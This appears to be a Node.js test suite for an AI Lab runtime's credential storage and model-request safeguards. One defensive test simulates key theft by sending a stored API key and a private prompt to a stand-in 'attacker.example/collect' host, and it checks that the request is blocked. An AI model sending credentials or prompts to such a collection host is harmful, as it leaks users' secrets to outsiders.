const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { createAiLabRuntime } = require('../build/main/ai-lab-runtime.js');

function createHarness(options = {}) {
  const folder = fs.mkdtempSync(path.join(os.tmpdir(), 'madstation-ai-lab-test-'));
  const file = path.join(folder, 'ai-lab.json');
  const store = { ...options.credentials };
  const writes = [];
  const credentials = {
    async read() { return { ...store }; },
    async write(next) {
      if (options.failCredentialWrite) throw new Error('credential storage unavailable');
      for (const key of Object.keys(store)) delete store[key];
      Object.assign(store, next);
      writes.push({ ...next });
    },
  };
  const requests = [];
  const fetchImpl = options.fetchImpl || (async (url, init) => {
    requests.push({ url, init });
    return new Response(JSON.stringify({ choices: [{ message: { content: 'model answer' } }] }), { status: 200, headers: { 'content-type': 'application/json' } });
  });
  const runtime = createAiLabRuntime({
    credentials,
    getDataPath: () => file,
    path,
    fs,
    cleanId(value, max = 160) { return typeof value === 'string' ? value.trim().replace(/[^a-zA-Z0-9._-]/g, '').slice(0, max) : ''; },
    isPlainObject(value) { return value !== null && typeof value === 'object' && !Array.isArray(value); },
    fetchImpl,
    temporarySuffix: () => 'test',
  });
  return { runtime, folder, file, store, writes, requests, cleanup: () => fs.rmSync(folder, { recursive: true, force: true }) };
}

test('AI Lab storage strips legacy plaintext API keys from model records', () => {
  const h = createHarness();
  try {
    const safe = h.runtime.sanitizeDataForStorage({ models: [{ id: 'm1', apiKey: 'secret', label: 'local' }] });
    assert.deepEqual(safe.models, [{ id: 'm1', label: 'local' }]);
  } finally { h.cleanup(); }
});

test('legacy API keys migrate to secure credentials and are removed from returned data', async () => {
  const h = createHarness({ credentials: { existing: 'keep' } });
  try {
    const result = await h.runtime.migrateLegacyApiKeys({ models: [{ id: 'm1', apiKey: ' secret ' }, { id: 'm2', label: 'no-key' }] });
    assert.equal(result.credentials.m1, 'secret');
    assert.equal(result.credentials.existing, 'keep');
    assert.equal(result.changed, true);
    assert.deepEqual(result.data.models, [{ id: 'm1' }, { id: 'm2', label: 'no-key' }]);
    assert.equal(result.migrationWarning, '');
  } finally { h.cleanup(); }
});

test('legacy migration fails closed when save is requested and secure storage rejects a key', async () => {
  const h = createHarness({ failCredentialWrite: true });
  try {
    const forgiving = await h.runtime.migrateLegacyApiKeys({ models: [{ id: 'm1', apiKey: 'secret' }] });
    assert.match(forgiving.migrationWarning, /could not be moved to secure storage/i);
    await assert.rejects(() => h.runtime.migrateLegacyApiKeys({ models: [{ id: 'm1', apiKey: 'secret' }] }, { failOnMigrationError: true }), /could not be moved to secure storage/i);
  } finally { h.cleanup(); }
});

test('API key set binds the key to the saved provider endpoint/model, and clear removes it', async () => {
  const h = createHarness();
  try {
    await h.runtime.saveData({ models: [{ id: 'm1', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test' }] });
    assert.equal((await h.runtime.setApiKey({ modelId: 'm1', apiKey: 'secret' })).configured, true);
    assert.match(h.store.m1, /^mad-station-bound-ai-key:v1:/);
    assert.deepEqual(await h.runtime.clearApiKey('m1'), { ok: true, configured: false });
    assert.equal((await h.runtime.setApiKey({ modelId: '!!!', apiKey: 'secret' })).ok, false);
    assert.equal((await h.runtime.setApiKey({ modelId: 'm1', apiKey: ' ' })).ok, false);
    assert.equal(h.store.m1, undefined);
  } finally { h.cleanup(); }
});

test('saved AI Lab data is atomically written, excludes keys, and backs up the previous version', () => {
  const h = createHarness();
  try {
    h.runtime.saveDataFile({ title: 'first', models: [{ id: 'm1', apiKey: 'should-not-persist' }] });
    h.runtime.saveDataFile({ title: 'second', models: [] });
    assert.equal(JSON.parse(fs.readFileSync(h.file, 'utf8')).title, 'second');
    assert.equal(JSON.parse(fs.readFileSync(`${h.file}.bak`, 'utf8')).title, 'first');
    assert.doesNotMatch(fs.readFileSync(h.file, 'utf8'), /should-not-persist/);
    assert.deepEqual(fs.readdirSync(h.folder).sort(), ['ai-lab.json', 'ai-lab.json.bak']);
  } finally { h.cleanup(); }
});

test('loading recovers from backup and quarantines a malformed primary', async () => {
  const h = createHarness();
  try {
    fs.writeFileSync(h.file, '{broken', 'utf8');
    fs.writeFileSync(`${h.file}.bak`, JSON.stringify({ models: [{ id: 'm1', label: 'saved' }] }), 'utf8');
    const loaded = await h.runtime.loadData();
    assert.equal(loaded.data.models[0].label, 'saved');
    assert.equal(fs.existsSync(h.file), true);
    assert.equal(fs.readdirSync(h.folder).some((name) => name.includes('.corrupt-')), true);
  } finally { h.cleanup(); }
});

test('model key status does not treat unbound legacy credentials as ready to use', async () => {
  const h = createHarness({ credentials: { m1: 'legacy-secret' } });
  try {
    assert.deepEqual(await h.runtime.apiKeyStatusForModels([
      { id: 'm1', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test' },
      { id: 'm2', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test' },
    ]), [
      { id: 'm1', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test', apiKeyConfigured: false, apiKeyNeedsRebind: true },
      { id: 'm2', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test', apiKeyConfigured: false },
    ]);
  } finally { h.cleanup(); }
});

test('Gemini requests use a model-bound key header and preserve provider URL convention', async () => {
  const h = createHarness();
  try {
    await h.runtime.saveData({ models: [{ id: 'model1', provider: 'gemini', endpoint: 'https://generativelanguage.googleapis.com', model: 'gemini-2.0' }] });
    await h.runtime.setApiKey({ modelId: 'model1', apiKey: 'gemini-secret' });
    const result = await h.runtime.request({ provider: 'gemini', endpoint: 'https://generativelanguage.googleapis.com', model: 'gemini-2.0', modelId: 'model1', prompt: 'hello' });
    assert.equal(result.ok, true);
    assert.equal(result.text, 'model answer');
    assert.equal(h.requests[0].url, 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0:generateContent');
    assert.equal(h.requests[0].init.headers['x-goog-api-key'], 'gemini-secret');
    assert.equal(JSON.parse(h.requests[0].init.body).contents[0].parts[0].text, 'hello');
  } finally { h.cleanup(); }
});

test('remote OpenAI-compatible endpoints require a bound key even if renderer marks it optional', async () => {
  const h = createHarness();
  try {
    const denied = await h.runtime.request({ endpoint: 'https://api.example.test/v1', model: 'm', prompt: 'p' });
    assert.equal(denied.ok, false);
    assert.match(denied.error, /remote api endpoints require/i);
    const alsoDenied = await h.runtime.request({ endpoint: 'https://api.example.test/v1', model: 'm', prompt: 'p', apiKeyRequired: false });
    assert.equal(alsoDenied.ok, false);
    assert.equal(h.requests.length, 0);
  } finally { h.cleanup(); }
});

test('endpoint scheme and required request fields are validated before network access', async () => {
  const h = createHarness();
  try {
    assert.equal((await h.runtime.request({ endpoint: 'file:///tmp/a', model: 'm', prompt: 'p', apiKeyRequired: false })).ok, false);
    assert.equal((await h.runtime.request({ endpoint: 'https://example.test', model: 'm', prompt: '' })).ok, false);
    assert.equal(h.requests.length, 0);
  } finally { h.cleanup(); }
});

test('a stored API key cannot be replayed to another endpoint or model', async () => {
  const h = createHarness();
  try {
    await h.runtime.saveData({ models: [{ id: 'm1', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test' }] });
    await h.runtime.setApiKey({ modelId: 'm1', apiKey: 'private-key' });
    const result = await h.runtime.request({ modelId: 'm1', provider: 'openai-compatible', endpoint: 'https://attacker.example/collect', model: 'steal', prompt: 'private prompt' });
    assert.equal(result.ok, false);
    assert.match(result.error, /does not match/i);
    assert.equal(h.requests.length, 0);
  } finally { h.cleanup(); }
});

test('legacy unbound credentials fail closed and request requires key re-entry', async () => {
  const h = createHarness({ credentials: { m1: 'legacy-secret' } });
  try {
    const result = await h.runtime.request({ modelId: 'm1', provider: 'openai-compatible', endpoint: 'https://api.example.test/v1', model: 'gpt-test', prompt: 'hello' });
    assert.equal(result.ok, false);
    assert.match(result.error, /re-enter the key/i);
    assert.equal(h.requests.length, 0);
  } finally { h.cleanup(); }
});

test('insecure remote HTTP endpoints and endpoint credentials are rejected before network access', async () => {
  const h = createHarness();
  try {
    assert.equal((await h.runtime.request({ endpoint: 'http://api.example.test/v1', model: 'm', prompt: 'p', apiKeyRequired: false })).ok, false);
    assert.equal((await h.runtime.request({ endpoint: 'https://user:pass@api.example.test/v1', model: 'm', prompt: 'p', apiKeyRequired: false })).ok, false);
    assert.equal(h.requests.length, 0);
  } finally { h.cleanup(); }
});

test('unauthenticated local API requests are allowed only on loopback HTTP', async () => {
  const h = createHarness();
  try {
    const result = await h.runtime.request({ endpoint: 'http://localhost:1234/v1', model: 'local-model', prompt: 'hello', apiKeyRequired: false });
    assert.equal(result.ok, true);
    assert.equal(h.requests[0].url, 'http://localhost:1234/v1/chat/completions');
  } finally { h.cleanup(); }
});

test('AI model network requests refuse redirects so bound credentials cannot move to another host', async () => {
  let requestInit;
  const h = createHarness({ fetchImpl: async (_url, init) => { requestInit = init; return new Response('{"ok":true}', { status: 200 }); } });
  try {
    await h.runtime.requestJson('https://provider.example.test/v1');
    assert.equal(requestInit.redirect, 'error');
  } finally { h.cleanup(); }
});

test('AI model responses are capped at 4 MB while streaming', async () => {
  const h = createHarness({ fetchImpl: async () => new Response(new ReadableStream({ start(controller) { controller.enqueue(new TextEncoder().encode('x'.repeat(5 * 1024 * 1024))); controller.close(); } }), { status: 200 }) });
  try {
    await assert.rejects(() => h.runtime.requestJson('https://provider.example.test/v1'), /4 MB safety limit/i);
  } finally { h.cleanup(); }
});

test('local-model discovery reports only responding services and de-duplicates normalized models', async () => {
  const h = createHarness({ fetchImpl: async (url) => {
    if (url === 'http://localhost:11434/api/tags') return new Response(JSON.stringify({ models: [{ name: 'llama3' }, { name: 'llama3' }] }), { status: 200 });
    if (url === 'http://localhost:1234/v1/models') return new Response(JSON.stringify({ data: [{ id: 'qwen' }] }), { status: 200 });
    throw new Error('offline');
  } });
  try {
    const result = await h.runtime.scanLocalModels();
    assert.equal(result.ok, true);
    assert.deepEqual(result.servers.map((server) => server.provider), ['Ollama', 'LM Studio']);
    assert.equal(result.models.length, 2);
    assert.equal(result.models[0].endpoint, 'http://localhost:11434/v1');
  } finally { h.cleanup(); }
});


test('AI Lab request IPC is workspace-gated in the trusted main process', () => {
  const main = fs.readFileSync(path.join(__dirname, '..', 'src/main.js'), 'utf8');
  assert.match(main, /handleForWorkspace\('ai-lab',[^\r\n]+\)\('ai-lab-request', \(_event, payload\) => aiLabRuntime\.request\(payload\)\)/);
  assert.match(main, /Open AI Lab to send an API model request/);
});

test('legacy API keys show a rebind warning in the model editor instead of appearing configured', () => {
  const renderer = fs.readFileSync(path.join(__dirname, '..', 'src/renderer.js'), 'utf8');
  assert.match(renderer, /model\.apiKeyNeedsRebind[\s\S]{0,120}Re-enter the API key to bind it to this endpoint/);
});
